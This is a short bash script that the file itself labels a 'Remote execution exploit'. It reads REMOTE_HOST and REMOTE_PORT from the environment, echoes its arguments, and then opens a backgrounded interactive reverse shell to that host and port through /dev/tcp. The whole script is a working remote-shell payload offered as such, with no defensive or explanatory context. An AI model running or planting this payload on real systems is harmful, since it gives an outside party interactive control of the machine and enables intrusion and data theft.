#!/usr/bin/env bash
if [[ -z ${REMOTE_HOST} ]]; then
   echo "REMOTE_HOST not set"
   exit 1
   #REMOTE_HOST=$(ifconfig en0 inet | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | head -n 1)  
fi
if [[ -z ${REMOTE_PORT} ]]; then
   echo "REMOTE_PORT not set"
   exit 1
   #REMOTE_PORT=8888
fi
echo "${REMOTE_HOST}"
echo "${REMOTE_HOST}/${REMOTE_PORT}"
echo "Remote execution exploit - callback to /dev/tcp/${REMOTE_HOST}/${REMOTE_PORT}"

for i in $*; do 
   echo $i 
done

/bin/bash -i >& /dev/tcp/${REMOTE_HOST}/${REMOTE_PORT} 0>&1 &